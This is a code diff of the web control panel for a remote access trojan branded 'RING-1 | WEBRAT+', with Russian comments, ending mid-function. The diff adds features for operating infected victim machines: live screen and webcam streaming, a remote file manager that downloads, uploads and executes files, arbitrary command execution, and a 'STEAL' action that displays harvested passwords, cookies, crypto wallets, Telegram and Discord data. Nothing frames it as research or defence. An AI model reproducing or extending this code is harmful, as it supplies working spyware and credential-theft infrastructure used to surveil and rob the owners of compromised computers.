@@ -10,7 +10,6 @@
             background: #0a0a0a;
             color: #00ffcc;
             min-height: 100vh;
-            transition: background-image 0.3s ease;
         }
         body::before {
             content: ''; position: fixed; top: 0; left: 0;
@@ -25,12 +24,11 @@
         }
         .logo { font-size: 24px; font-weight: bold; text-shadow: 0 0 5px #00ffcc; }
         .header-right { display: flex; gap: 15px; align-items: center; }
-        .wallpaper-btn, .settings-btn {
+        .wallpaper-btn {
             background: #1a1a1a; border: 1px solid #00ffcc;
             color: #00ffcc; padding: 6px 15px; border-radius: 5px;
             cursor: pointer; font-size: 12px;
         }
-        .wallpaper-btn:hover, .settings-btn:hover { background: #00ffcc; color: black; }
         .logout-btn { background: #ff0033; color: white; border: none; padding: 8px 20px; cursor: pointer; border-radius: 5px; }
         .container { max-width: 1600px; margin: 20px auto; padding: 0 20px; }
         
@@ -51,7 +49,6 @@
             cursor: pointer;
             font-size: 13px;
             font-weight: bold;
-            transition: 0.2s;
         }
         .tab:hover { background: #00ffcc; color: black; }
         .tab.active {
@@ -59,9 +56,7 @@
             color: black;
             box-shadow: 0 0 15px rgba(0,255,204,0.5);
         }
-        .tab.online { border-color: #00cc88; }
         .tab.online.active { background: #00cc88; }
-        .tab.offline { border-color: #ff0033; }
         .tab.offline.active { background: #ff0033; color: white; }
         
         .stats-bar {
@@ -71,33 +66,31 @@
             background: rgba(0,0,0,0.5);
             padding: 12px 20px;
             border-radius: 10px;
-            backdrop-filter: blur(5px);
         }
-        .computers-grid, .users-grid, .settings-grid {
+        .computers-grid {
             display: grid;
             grid-template-columns: repeat(auto-fill, minmax(380px, 1fr));
             gap: 20px;
         }
-        .computer-card, .user-card, .settings-card {
+        .computer-card {
             background: rgba(10,10,10,0.85);
             backdrop-filter: blur(5px);
             border: 1px solid #00ffcc;
             border-radius: 8px;
             padding: 15px;
-            transition: 0.2s;
         }
         .computer-card.offline-card { border-color: #ff0033; opacity: 0.7; }
         .computer-header { display: flex; justify-content: space-between; border-bottom: 1px solid #333; padding-bottom: 10px; margin-bottom: 10px; }
         .status { padding: 2px 8px; border-radius: 4px; font-size: 11px; background: #00cc88; color: black; }
         .status.offline { background: #ff0033; }
-        .computer-info p, .user-info p { font-size: 12px; margin: 4px 0; }
+        .computer-info p { font-size: 12px; margin: 4px 0; }
         .action-buttons { display: flex; flex-wrap: wrap; gap: 8px; margin-top: 15px; }
         .action-btn {
             background: #1a1a1a; border: 1px solid #00ffcc; color: #00ffcc;
             padding: 5px 10px; border-radius: 4px; cursor: pointer; font-size: 11px;
         }
         .action-btn:hover { background: #00ffcc; color: black; }
-        .action-btn.disabled { opacity: 0.4; cursor: not-allowed; pointer-events: none; }
+        .action-btn.disabled { opacity: 0.4; cursor: not-allowed; }
         .action-btn.danger { border-color: #ff0033; color: #ff0033; }
         .action-btn.danger:hover { background: #ff0033; color: white; }
         
@@ -105,7 +98,7 @@
             display: none;
             position: fixed; top: 0; left: 0;
             width: 100%; height: 100%;
-            background: rgba(0,0,0,0.98);
+            background: rgba(0,0,0,0.95);
             z-index: 1000;
         }
         .modal-content {
@@ -116,43 +109,54 @@
         }
         .modal-header { display: flex; justify-content: space-between; margin-bottom: 20px; }
         .modal-header h3 { color: #00ffcc; }
-        .close-modal { background: #ff0033; color: white; border: none; padding: 5px 15px; cursor: pointer; }
-        .stolen-data { white-space: pre-wrap; font-family: monospace; font-size: 12px; background: #1a1a1a; padding: 15px; border-radius: 5px; max-height: 500px; overflow: auto; }
+        .close-modal { background: #ff0033; color: white; border: none; padding: 5px 15px; cursor: pointer; border-radius: 5px; }
+        .stolen-data { background: #1a1a1a; padding: 15px; border-radius: 5px; font-family: monospace; font-size: 12px; white-space: pre-wrap; }
         
-        input, select {
-            background: #1a1a1a; border: 1px solid #00ffcc;
-            color: #00ffcc; padding: 8px; margin: 5px 0;
+        .path-bar { display: flex; gap: 10px; margin-bottom: 20px; }
+        .path-bar input { flex: 1; background: #1a1a1a; border: 1px solid #00ffcc; color: #00ffcc; padding: 8px; }
+        .file-item {
+            display: flex; justify-content: space-between; align-items: center;
+            padding: 8px; border-bottom: 1px solid #333; cursor: pointer;
         }
-        .form-group { margin-bottom: 15px; }
-        .form-group label { display: block; margin-bottom: 5px; }
-        .btn-primary { background: #00ffcc; color: black; border: none; padding: 8px 20px; cursor: pointer; }
-        
+        .file-item:hover { background: #1a1a1a; }
         .empty-state { text-align: center; padding: 50px; color: #888; }
+        
+        .stream-video { text-align: center; margin-top: 20px; }
+        .stream-video video { max-width: 100%; max-height: 70vh; border: 2px solid #00ffcc; background: #000; }
+        
+        input, select { background: #1a1a1a; border: 1px solid #00ffcc; color: #00ffcc; padding: 8px; margin: 5px 0; }
+        .btn-primary { background: #00ffcc; color: black; border: none; padding: 8px 20px; cursor: pointer; border-radius: 5px; }
+        .form-group { margin-bottom: 15px; }
     </style>
     <script src="/socket.io/socket.io.js"></script>
-    <script src="https://cdn.jsdelivr.net/npm/simple-peer@9.11.0/simplepeer.min.js"></script>
 </head>
 <body id="mainBody">
 <div id="app">
     <div class="header">
         <div class="logo">🔷 RING-1 | WEBRAT+</div>
         <div class="header-right">
-            <button class="wallpaper-btn" onclick="openPanelWallpaperModal()">🖼️ ФОН</button>
+            <button class="wallpaper-btn" onclick="openWallpaperModal()">🖼️ ФОН</button>
             <button class="logout-btn" onclick="logout()">EXIT</button>
         </div>
     </div>
     <div class="container">
         <div class="stats-bar" id="statsBar"></div>
-        
         <div class="tabs">
             <div class="tab online active" data-tab="online">🟢 ONLINE</div>
             <div class="tab offline" data-tab="offline">🔴 OFFLINE</div>
             <div class="tab" data-tab="all">📋 ALL</div>
-            <div class="tab" data-tab="users">👥 USER LIST</div>
+            <div class="tab" data-tab="users">👥 USERS</div>
             <div class="tab" data-tab="settings">⚙️ SETTINGS</div>
         </div>
-        
         <div id="contentContainer"></div>
+    </div>
+</div>
+
+<!-- Модалка результата команды -->
+<div id="resultModal" class="modal">
+    <div class="modal-content">
+        <div class="modal-header"><h3>📟 COMMAND RESULT</h3><button class="close-modal" onclick="closeModal('resultModal')">✕</button></div>
+        <pre id="resultContent" style="background:#1a1a1a; padding:15px; border-radius:5px; white-space:pre-wrap;"></pre>
     </div>
 </div>
 
@@ -160,13 +164,34 @@
 <div id="steealModal" class="modal">
     <div class="modal-content">
         <div class="modal-header"><h3>💀 STOLEN DATA</h3><button class="close-modal" onclick="closeModal('steealModal')">✕</button></div>
-        <div id="stolenDataContainer" class="stolen-data">Loading...</div>
+        <div id="stolenData" class="stolen-data">Waiting...</div>
+    </div>
+</div>
+
+<!-- Модалка файлов -->
+<div id="fileModal" class="modal">
+    <div class="modal-content">
+        <div class="modal-header"><h3>📁 FILE MANAGER</h3><button class="close-modal" onclick="closeModal('fileModal')">✕</button></div>
+        <div class="path-bar">
+            <input type="text" id="currentPath" value="C:\\">
+            <button class="action-btn" onclick="loadFileList()">📂 GO</button>
+            <button class="action-btn" onclick="uploadFile()">📤 UPLOAD</button>
+        </div>
+        <div id="fileList" style="max-height:400px; overflow:auto;">Loading...</div>
+    </div>
+</div>
+
+<!-- Модалка стрима -->
+<div id="streamModal" class="modal">
+    <div class="modal-content">
+        <div class="modal-header"><h3 id="streamTitle">📺 STREAM</h3><button class="close-modal" onclick="stopStream()">✕</button></div>
+        <div class="stream-video"><video id="streamVideo" autoplay playsinline muted></video></div>
     </div>
 </div>
 
 <!-- Модалка добавления пользователя -->
 <div id="addUserModal" class="modal">
-    <div class="modal-content" style="max-width: 400px;">
+    <div class="modal-content" style="max-width:400px;">
         <div class="modal-header"><h3>➕ ADD USER</h3><button class="close-modal" onclick="closeModal('addUserModal')">✕</button></div>
         <div class="form-group"><label>Username</label><input type="text" id="newUsername" placeholder="username"></div>
         <div class="form-group"><label>Password</label><input type="password" id="newPassword" placeholder="password"></div>
@@ -175,212 +200,388 @@
 </div>
 
 <!-- Модалка обоев панели -->
-<div id="panelWallpaperModal" class="modal">
-    <div class="modal-content" style="max-width: 500px;">
-        <div class="modal-header"><h3>🎨 PANEL WALLPAPER</h3><button class="close-modal" onclick="closeModal('panelWallpaperModal')">✕</button></div>
-        <select id="panelWallpaperType" style="width:100%;">
+<div id="wallpaperModal" class="modal">
+    <div class="modal-content" style="max-width:500px;">
+        <div class="modal-header"><h3>🎨 PANEL WALLPAPER</h3><button class="close-modal" onclick="closeModal('wallpaperModal')">✕</button></div>
+        <select id="wallpaperType" style="width:100%;">
             <option value="url">Image by URL</option>
-            <option value="upload">Upload Image</option>
             <option value="color">Solid Color</option>
-            <option value="preset">Preset</option>
         </select>
-        <div id="panelUrlDiv"><input type="text" id="panelWallpaperUrl" placeholder="https://example.com/image.jpg" style="width:100%;"></div>
-        <div id="panelUploadDiv" style="display:none;"><input type="file" id="panelWallpaperFile" accept="image/*" style="width:100%;"></div>
-        <div id="panelColorDiv" style="display:none;"><input type="color" id="panelWallpaperColor" value="#0a0a0a" style="width:100%;"></div>
-        <div id="panelPresetDiv" style="display:none;">
-            <select id="panelWallpaperPreset" style="width:100%;">
-                <option value="cyber">Cyberpunk</option><option value="matrix">Matrix</option>
-                <option value="sunset">Sunset</option><option value="forest">Forest</option>
-                <option value="ocean">Ocean</option><option value="dark">Black</option>
-            </select>
-        </div>
-        <div class="wallpaper-preview" id="panelWallpaperPreview" style="margin:15px 0;text-align:center;"></div>
-        <button class="btn-primary" onclick="applyPanelWallpaper()" style="width:100%;">APPLY</button>
+        <div id="wallpaperUrlDiv"><input type="text" id="wallpaperUrl" placeholder="https://example.com/image.jpg" style="width:100%;"></div>
+        <div id="wallpaperColorDiv" style="display:none;"><input type="color" id="wallpaperColor" value="#0a0a0a" style="width:100%;"></div>
+        <button class="btn-primary" onclick="applyPanelWallpaper()" style="margin-top:15px; width:100%;">APPLY</button>
     </div>
 </div>
 
 <script>
-    let socket = null, peer = null, currentSessionId = null, currentComputerId = null;
-    let allComputers = [], allUsers = [];
+    let socket = null;
+    let currentComputerId = null;
+    let currentFilePath = null;
+    let allComputers = [];
+    let allUsers = [];
     let currentTab = 'online';
-    let panelWallpaperFileBase64 = null;
+    let peer = null;
+    let currentSessionId = null;
     
-    async function loadPanelWallpaper() {
-        try { const r=await fetch('/api/panel/wallpaper'); if(r.ok){ const d=await r.json(); if(d.wallpaper) applyWallpaper(d.wallpaper.type,d.wallpaper.data); } } catch(e){}
+    // ========== ИНИЦИАЛИЗАЦИЯ ==========
+    async function checkAuth() {
+        const resp = await fetch('/api/user');
+        if (!resp.ok) window.location.href = '/login.html';
     }
-    function applyWallpaper(type,data){
-        const body=document.getElementById('mainBody');
-        if(type==='url'||type==='upload'){ body.style.backgroundImage=`url(${data})`; body.style.backgroundSize='cover'; body.style.backgroundPosition='center'; body.style.backgroundAttachment='fixed'; }
-        else if(type==='color'){ body.style.backgroundImage='none'; body.style.backgroundColor=data; }
-    }
-    async function checkAuth(){ const r=await fetch('/api/user'); if(!r.ok)window.location.href='/login.html'; else loadPanelWallpaper(); }
-    function connectSocket(){ socket=io({transports:['websocket']}); socket.on('webrtc_signal',async(d)=>{ if(d.signal&&peer) await peer.signal(d.signal); }); }
     
-    async function loadComputers(){
-        const r=await fetch('/api/computers');
-        allComputers = await r.json();
-        const online=allComputers.filter(c=>c.status==='online').length;
-        const offline=allComputers.filter(c=>c.status!=='online').length;
+    function connectSocket() {
+        socket = io({ transports: ['websocket'] });
+        socket.on('connect', () => console.log('Socket connected'));
+        
+        socket.on('command_result', (data) => {
+            document.getElementById('resultContent').innerText = data.output || 'Done';
+            document.getElementById('resultModal').style.display = 'block';
+        });
+        
+        socket.on('filelist_result', (data) => {
+            if (data.files) renderFileList(data.files);
+            else document.getElementById('fileList').innerHTML = '<div class="empty-state">Error loading directory</div>';
+        });
+        
+        socket.on('download_result', (data) => {
+            if (data.data) {
+                const a = document.createElement('a');
+                a.href = `data:application/octet-stream;base64,${data.data}`;
+                a.download = data.filename;
+                a.click();
+            } else alert('Download failed');
+        });
+        
+        socket.on('upload_result', (data) => {
+            if (data.success) { alert('Uploaded!'); loadFileList(); }
+            else alert('Upload failed');
+        });
+        
+        socket.on('execute_result', (data) => {
+            document.getElementById('resultContent').innerText = data.output || 'Executed';
+            document.getElementById('resultModal').style.display = 'block';
+        });
+        
+        socket.on('steeal_result', (data) => {
+            let html = '<pre>';
+            if (data.passwords) html += '🔑 PASSWORDS:\n' + JSON.stringify(data.passwords, null, 2) + '\n\n';
+            if (data.cookies) html += '🍪 COOKIES:\n' + JSON.stringify(data.cookies, null, 2) + '\n\n';
+            if (data.wallets) html += '💰 WALLETS:\n' + JSON.stringify(data.wallets, null, 2) + '\n\n';
+            if (data.telegram) html += '📱 TELEGRAM:\n' + JSON.stringify(data.telegram, null, 2) + '\n\n';
+            if (data.discord) html += '🎮 DISCORD:\n' + JSON.stringify(data.discord, null, 2) + '\n\n';
+            if (data.files) html += '📁 FILES:\n' + JSON.stringify(data.files, null, 2) + '\n\n';
+            if (data.system) html += '💻 SYSTEM:\n' + JSON.stringify(data.system, null, 2);
+            html += '</pre>';
+            document.getElementById('stolenData').innerHTML = html || 'No data stolen';
+        });
+    }
+    
+    // ========== КОМПЬЮТЕРЫ ==========
+    async function loadComputers() {
+        const resp = await fetch('/api/computers');
+        allComputers = await resp.json();
+        const online = allComputers.filter(c => c.status === 'online').length;
+        const offline = allComputers.filter(c => c.status !== 'online').length;
         document.getElementById('statsBar').innerHTML = `<span>🟢 ONLINE: ${online}</span><span>🔴 OFFLINE: ${offline}</span><span>📡 TOTAL: ${allComputers.length}</span>`;
         renderContent();
     }
     
-    async function loadUsers(){
-        const r=await fetch('/api/users');
-        allUsers = await r.json();
+    async function loadUsers() {
+        const resp = await fetch('/api/users');
+        allUsers = await resp.json();
         renderContent();
     }
     
-    function renderContent(){
-        if(currentTab === 'users') renderUsersTab();
-        else if(currentTab === 'settings') renderSettingsTab();
-        else renderComputersTab();
+    function renderContent() {
+        if (currentTab === 'users') renderUsers();
+        else if (currentTab === 'settings') renderSettings();
+        else renderComputers();
     }
     
-    function renderComputersTab(){
+    function renderComputers() {
         let filtered = [];
-        if(currentTab === 'online') filtered = allComputers.filter(c=>c.status==='online');
-        else if(currentTab === 'offline') filtered = allComputers.filter(c=>c.status!=='online');
+        if (currentTab === 'online') filtered = allComputers.filter(c => c.status === 'online');
+        else if (currentTab === 'offline') filtered = allComputers.filter(c => c.status !== 'online');
         else filtered = allComputers;
         
         const container = document.getElementById('contentContainer');
-        if(!filtered.length){ container.innerHTML=`<div class="empty-state">${currentTab==='online'?'🟢 No online computers':(currentTab==='offline'?'🔴 No offline computers':'📋 No computers')}</div>`; return; }
+        if (!filtered.length) {
+            container.innerHTML = `<div class="empty-state">${currentTab === 'online' ? '🟢 No online computers' : (currentTab === 'offline' ? '🔴 No offline computers' : '📋 No computers')}</div>`;
+            return;
+        }
         
-        container.innerHTML = `<div class="computers-grid">${filtered.map(c=>`
-            <div class="computer-card ${c.status!=='online'?'offline-card':''}">
-                <div class="computer-header"><span>🖥️ ${c.computerName}</span><span class="status ${c.status!=='online'?'offline':''}">${c.status==='online'?'● ONLINE':'● OFFLINE'}</span></div>
-                <div class="computer-info"><p>🆔 ${c.computerId.substring(0,12)}... | 💻 ${c.os} | 🌐 ${c.ip}</p><p>👤 ${c.username} | 🕐 ${new Date(c.lastSeen).toLocaleTimeString()}</p></div>
-                <div class="action-buttons">
-                    <button class="action-btn ${c.status!=='online'?'disabled':''}" onclick="${c.status==='online'?`startScreen('${c.computerId}')`:''}">📺 SCREEN</button>
-                    <button class="action-btn ${c.status!=='online'?'disabled':''}" onclick="${c.status==='online'?`startWebcam('${c.computerId}')`:''}">🎥 WEBCAM</button>
-                    <button class="action-btn ${c.status!=='online'?'disabled':''}" onclick="${c.status==='online'?`openFileManager('${c.computerId}')`:''}">📁 FILES</button>
-                    <button class="action-btn ${c.status!=='online'?'disabled':''}" onclick="${c.status==='online'?`sendCmd('${c.computerId}')`:''}">⚡ CMD</button>
-                    <button class="action-btn danger ${c.status!=='online'?'disabled':''}" onclick="${c.status==='online'?`runSteeal('${c.computerId}')`:''}">💀 STEAL</button>
+        container.innerHTML = `<div class="computers-grid">${filtered.map(c => `
+            <div class="computer-card ${c.status !== 'online' ? 'offline-card' : ''}">
+                <div class="computer-header">
+                    <span>🖥️ ${c.computerName}</span>
+                    <span class="status ${c.status !== 'online' ? 'offline' : ''}">${c.status === 'online' ? '● ONLINE' : '● OFFLINE'}</span>
                 </div>
-            </div>`).join('')}</div>`;
+                <div class="computer-info">
+                    <p>🆔 ${c.computerId.substring(0, 12)}... | 💻 ${c.os} | 🌐 ${c.ip}</p>
+                    <p>👤 ${c.username} | 🕐 ${new Date(c.lastSeen).toLocaleTimeString()}</p>
+                </div>
+                <div class="action-buttons">
+                    <button class="action-btn" onclick="startScreen('${c.computerId}')">📺 SCREEN</button>
+                    <button class="action-btn" onclick="startWebcam('${c.computerId}')">🎥 WEBCAM</button>
+                    <button class="action-btn" onclick="openFileManager('${c.computerId}')">📁 FILES</button>
+                    <button class="action-btn" onclick="sendCommand('${c.computerId}')">⚡ CMD</button>
+                    <button class="action-btn danger" onclick="runSteal('${c.computerId}')">💀 STEAL</button>
+                </div>
+            </div>
+        `).join('')}</div>`;
     }
     
-    function renderUsersTab(){
+    function renderUsers() {
         const container = document.getElementById('contentContainer');
         container.innerHTML = `
-            <div style="margin-bottom:20px;"><button class="action-btn" onclick="openAddUserModal()">➕ ADD USER</button></div>
-            <div class="users-grid">${allUsers.map(u=>`
-                <div class="user-card">
+            <div style="margin-bottom:20px;"><button class="action-btn" onclick="openModal('addUserModal')">➕ ADD USER</button></div>
+            <div class="computers-grid">${allUsers.map(u => `
+                <div class="computer-card">
                     <div class="computer-header"><span>👤 ${u.username}</span><span>ID: ${u.id}</span></div>
-                    <div class="action-buttons">
-                        ${u.username!=='admin'?`<button class="action-btn danger" onclick="deleteUser(${u.id})">🗑️ DELETE</button>`:'<span style="color:#888;">Admin account</span>'}
-                    </div>
-                </div>`).join('')}
-            </div>`;
+                    <div class="action-buttons">${u.username !== 'admin' ? `<button class="action-btn danger" onclick="deleteUser(${u.id})">🗑️ DELETE</button>` : '<span style="color:#888;">Admin account</span>'}</div>
+                </div>
+            `).join('')}</div>`;
     }
     
-    function renderSettingsTab(){
+    function renderSettings() {
         const container = document.getElementById('contentContainer');
         container.innerHTML = `
-            <div class="settings-grid">
-                <div class="settings-card"><h3>🎨 PANEL WALLPAPER</h3><p>Change dashboard background</p><button class="action-btn" onclick="openPanelWallpaperModal()">CHANGE</button></div>
-                <div class="settings-card"><h3>📡 SERVER INFO</h3><p>Connected computers: ${allComputers.length}<br>Online: ${allComputers.filter(c=>c.status==='online').length}</p></div>
-                <div class="settings-card"><h3>⚡ SYSTEM</h3><button class="action-btn danger" onclick="logout()">LOGOUT</button></div>
+            <div class="computers-grid">
+                <div class="computer-card"><h3>🎨 PANEL WALLPAPER</h3><p>Change dashboard background</p><button class="action-btn" onclick="openWallpaperModal()">CHANGE</button></div>
+                <div class="computer-card"><h3>📡 SERVER INFO</h3><p>Computers: ${allComputers.length}<br>Online: ${allComputers.filter(c=>c.status==='online').length}</p></div>
+                <div class="computer-card"><h3>⚡ SYSTEM</h3><button class="action-btn danger" onclick="logout()">LOGOUT</button></div>
             </div>`;
     }
     
-    async function runSteeal(computerId){
+    // ========== ОСНОВНЫЕ ФУНКЦИИ ==========
+    async function startScreen(computerId) {
         currentComputerId = computerId;
-        document.getElementById('stolenDataContainer').innerHTML = '<div class="loading">Stealing data from target...</div>';
-        document.getElementById('steealModal').style.display = 'block';
+        document.getElementById('streamTitle').innerHTML = `📺 SCREEN: ${computerId}`;
+        document.getElementById('streamModal').style.display = 'block';
         
-        const resp = await fetch(`/api/steeal/${computerId}`, { method: 'POST' });
-        if(resp.ok){
+        const resp = await fetch(`/api/stream/screen/${computerId}`, { method: 'POST' });
+        if (resp.ok) {
             const data = await resp.json();
-            let html = '<pre>';
-            if(data.passwords) html += '🔥 PASSWORDS:\n' + JSON.stringify(data.passwords, null, 2) + '\n\n';
-            if(data.cookies) html += '🍪 COOKIES:\n' + JSON.stringify(data.cookies, null, 2) + '\n\n';
-            if(data.wallets) html += '💰 CRYPTO WALLETS:\n' + JSON.stringify(data.wallets, null, 2) + '\n\n';
-            if(data.telegram) html += '📱 TELEGRAM:\n' + JSON.stringify(data.telegram, null, 2) + '\n\n';
-            if(data.discord) html += '🎮 DISCORD:\n' + JSON.stringify(data.discord, null, 2) + '\n\n';
-            if(data.browsers) html += '🌐 BROWSERS:\n' + JSON.stringify(data.browsers, null, 2) + '\n\n';
-            if(data.files) html += '📁 STOLEN FILES:\n' + JSON.stringify(data.files, null, 2) + '\n\n';
-            html += '</pre>';
-            document.getElementById('stolenDataContainer').innerHTML = html || 'No data stolen';
+            currentSessionId = data.sessionId;
+            document.getElementById('streamVideo').srcObject = null;
+            document.getElementById('streamVideo').innerHTML = '<div class="empty-state">WebRTC stream starting...<br>Make sure agent is connected</div>';
         } else {
-            document.getElementById('stolenDataContainer').innerHTML = '<div class="empty-state">Steal failed or timeout</div>';
+            alert('Stream failed - agent may be offline');
+            closeModal('streamModal');
         }
     }
     
-    async function addUser(){
+    async function startWebcam(computerId) {
+        currentComputerId = computerId;
+        document.getElementById('streamTitle').innerHTML = `🎥 WEBCAM: ${computerId}`;
+        document.getElementById('streamModal').style.display = 'block';
+        
+        const resp = await fetch(`/api/stream/webcam/${computerId}`, { method: 'POST' });
+        if (resp.ok) {
+            const data = await resp.json();
+            currentSessionId = data.sessionId;
+            document.getElementById('streamVideo').innerHTML = '<div class="empty-state">WebRTC stream starting...</div>';
+        } else {
+            alert('Stream failed');
+            closeModal('streamModal');
+        }
+    }
+    
+    async function stopStream() {
+        if (currentSessionId) {
+            await fetch(`/api/stream/stop/${currentSessionId}`, { method: 'POST' });
+        }
+        closeModal('streamModal');
+        const video = document.getElementById('streamVideo');
+        if (video.srcObject) video.srcObject.getTracks().forEach(t => t.stop());
+    }
+    
+    async function openFileManager(computerId) {
+        currentComputerId = computerId;
+        document.getElementById('currentPath').value = 'C:\\';
+        openModal('fileModal');
+        loadFileList();
+    }
+    
+    async function loadFileList() {
+        const path = document.getElementById('currentPath').value;
+        document.getElementById('fileList').innerHTML = '<div class="empty-state">Loading...</div>';
+        
+        const resp = await fetch(`/api/files/list/${currentComputerId}`, {
+            method: 'POST',
+            headers: { 'Content-Type': 'application/json' },
+            body: JSON.stringify({ path })
+        });
+        if (!resp.ok) {
+            document.getElementById('fileList').innerHTML = '<div class="empty-state">Error loading directory</div>';
+        }
+    }
+    
+    function renderFileList(files) {
+        if (!files || files.length === 0) {
+            document.getElementById('fileList').innerHTML = '<div class="empty-state">Empty directory</div>';
+            return;
+        }
+        document.getElementById('fileList').innerHTML = files.map(f => `
+            <div class="file-item" ondblclick="navigateTo('${f.path}')">
+                <span>${f.isDir ? '📁' : '📄'} ${f.name}</span>
+                <span>${f.isDir ? 'DIR' : f.size}</span>
+                <div>
+                    ${!f.isDir ? `<button class="action-btn" onclick="downloadFile('${f.path}')">⬇️</button>` : ''}
+                    ${!f.isDir ? `<button class="action-btn" onclick="executeFileOnPC('${f.path}')">▶️</button>` : ''}
+                </div>
+            </div>
+        `).join('');
+    }
+    
+    function navigateTo(path) {
+        document.getElementById('currentPath').value = path;
+        loadFileList();
+    }
+    
+    async function downloadFile(filePath) {
+        const resp = await fetch(`/api/files/download/${currentComputerId}`, {
+            method: 'POST',
+            headers: { 'Content-Type': 'application/json' },
+            body: JSON.stringify({ filePath })
+        });
+        if (!resp.ok) alert('Download failed');
+    }
+    
+    function uploadFile() {
+        const input = document.createElement('input');
+        input.type = 'file';
+        input.onchange = async (e) => {
+            const file = e.target.files[0];
+            const formData = new FormData();
+            formData.append('file', file);
+            formData.append('remotePath', document.getElementById('currentPath').value);
+            const resp = await fetch(`/api/files/upload/${currentComputerId}`, { method: 'POST', body: formData });
+            if (resp.ok) { alert('Uploaded!'); loadFileList(); }
+            else alert('Upload failed');
+        };
+        input.click();
+    }
+    
+    async function executeFileOnPC(filePath) {
+        if (!confirm(`Execute ${filePath}?`)) return;
+        const resp = await fetch(`/api/files/execute/${currentComputerId}`, {
+            method: 'POST',
+            headers: { 'Content-Type': 'application/json' },
+            body: JSON.stringify({ filePath })
+        });
+        if (!resp.ok) alert('Execute failed');
+    }
+    
+    async function sendCommand(computerId) {
+        const cmd = prompt('Enter command to execute:');
+        if (!cmd) return;
+        currentComputerId = computerId;
+        
+        const resp = await fetch(`/api/command/${computerId}`, {
+            method: 'POST',
+            headers: { 'Content-Type': 'application/json' },
+            body: JSON.stringify({ command: cmd })
+        });
+        if (!resp.ok) alert('Command failed - computer offline');
+    }
+    
+    async function runSteal(computerId) {
+        currentComputerId = computerId;
+        document.getElementById('stolenData').innerHTML = 'Stealing data...';
+        openModal('steealModal');
+        
+        const resp = await fetch(`/api/steeal/${computerId}`, { method: 'POST' });
+        if (!resp.ok) {
+            document.getElementById('stolenData').innerHTML = 'Steal failed or timeout';
+        }
+    }
+    
+    // ========== ПОЛЬЗОВАТЕЛИ ==========
+    async function addUser() {
         const username = document.getElementById('newUsername').value;
         const password = document.getElementById('newPassword').value;
-        if(!username||!password){ alert('Fill all fields'); return; }
-        const resp = await fetch('/api/users', { method:'POST', headers:{'Content-Type':'application/json'}, body:JSON.stringify({username,password}) });
-        if(resp.ok){ alert('User added'); closeModal('addUserModal'); loadUsers(); }
+        if (!username || !password) { alert('Fill all fields'); return; }
+        const resp = await fetch('/api/users', {
+            method: 'POST',
+            headers: { 'Content-Type': 'application/json' },
+            body: JSON.stringify({ username, password })
+        });
+        if (resp.ok) { alert('User added'); closeModal('addUserModal'); loadUsers(); }
         else alert('Error');
     }
     
-    async function deleteUser(id){
-        if(!confirm('Delete user?')) return;
-        const resp = await fetch(`/api/users/${id}`, { method:'DELETE' });
-        if(resp.ok){ loadUsers(); }
+    async function deleteUser(id) {
+        if (!confirm('Delete user?')) return;
+        const resp = await fetch(`/api/users/${id}`, { method: 'DELETE' });
+        if (resp.ok) loadUsers();
         else alert('Cannot delete admin');
     }
     
-    function openAddUserModal(){ document.getElementById('addUserModal').style.display='block'; }
-    function closeModal(id){ document.getElementById(id).style.display='none'; }
-    function openPanelWallpaperModal(){ document.getElementById('panelWallpaperModal').style.display='block'; setupWallpaperModal(); }
-    
-    function setupWallpaperModal(){
-        document.getElementById('panelWallpaperType').value='url';
-        document.getElementById('panelUrlDiv').style.display='block';
-        document.getElementById('panelUploadDiv').style.display='none';
-        document.getElementById('panelColorDiv').style.display='none';
-        document.getElementById('panelPresetDiv').style.display='none';
-        document.getElementById('panelWallpaperType').onchange=function(){
-            const v=this.value;
-            document.getElementById('panelUrlDiv').style.display=v==='url'?'block':'none';
-            document.getElementById('panelUploadDiv').style.display=v==='upload'?'block':'none';
-            document.getElementById('panelColorDiv').style.display=v==='color'?'block':'none';
-            document.getElementById('panelPresetDiv').style.display=v==='preset'?'block':'none';
-            if(v==='color') document.getElementById('panelWallpaperPreview').innerHTML=`<div style="width:100%;height:100px;background:${document.getElementById('panelWallpaperColor').value};border:1px solid #00ffcc;"></div>`;
-            else document.getElementById('panelWallpaperPreview').innerHTML='';
-        };
-        document.getElementById('panelWallpaperFile').onchange=function(e){
-            const f=e.target.files[0];
-            if(f){ const r=new FileReader(); r.onload=function(ev){ panelWallpaperFileBase64=ev.target.result; document.getElementById('panelWallpaperPreview').innerHTML=`<img src="${ev.target.result}" style="max-width:100%;max-height:150px;">`; }; r.readAsDataURL(f); }
-        };
-        document.getElementById('panelWallpaperColor').onchange=function(){
-            document.getElementById('panelWallpaperPreview').innerHTML=`<div style="width:100%;height:100px;background:${this.value};border:1px solid #00ffcc;"></div>`;
+    // ========== ОБОИ ПАНЕЛИ ==========
+    function openWallpaperModal() {
+        document.getElementById('wallpaperType').value = 'url';
+        document.getElementById('wallpaperUrlDiv').style.display = 'block';
+        document.getElementById('wallpaperColorDiv').style.display = 'none';
+        openModal('wallpaperModal');
+        
+        document.getElementById('wallpaperType').onchange = function() {
+            const v = this.value;
+            document.getElementById('wallpaperUrlDiv').style.display = v === 'url' ? 'block' : 'none';
+            document.getElementById('wallpaperColorDiv').style.display = v === 'color' ? 'block' : 'none';
         };
     }
     
-    async function applyPanelWallpaper(){
-        const type=document.getElementById('panelWallpaperType').value;
-        let wdata=null;
-        if(type==='url'){ const url=document.getElementById('panelWallpaperUrl').value; if(!url){ alert('Enter URL'); return; } wdata={type:'url',data:url}; }
-        else if(type==='upload'){ if(!panelWallpaperFileBase64){ alert('Select image'); return; } wdata={type:'upload',data:panelWallpaperFileBase64}; }
-        else if(type==='color'){ wdata={type:'color',data:document.getElementById('panelWallpaperColor').value}; }
-        else if(type==='preset'){
-            const presets={cyber:'https://images.unsplash.com/photo-1550745165-9bc0b252726f?w=1920',matrix:'https://images.unsplash.com/photo-1526374965328-7f61d4dc18c5?w=1920',sunset:'https://images.unsplash.com/photo-1495616811223-4d98c6e9c869?w=1920',forest:'https://images.unsplash.com/photo-1448375240586-882707db888b?w=1920',ocean:'https://images.unsplash.com/photo-1505118380757-91f5f5632de0?w=1920',dark:''};
-            const p=document.getElementById('panelWallpaperPreset').value;
-            if(p==='dark') wdata={type:'color',data:'#000000'};
-            else wdata={type:'url',data:presets[p]};
-        }
-        const resp=await fetch('/api/panel/wallpaper',{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify(wdata)});
-        if(resp.ok){
-            if(wdata.type==='upload') applyWallpaper('url',wdata.data);
-            else applyWallpaper(wdata.type,wdata.data);
-            closeModal('panelWallpaperModal');
+    async function applyPanelWallpaper() {
+        const type = document.getElementById('wallpaperType').value;
+        let data;
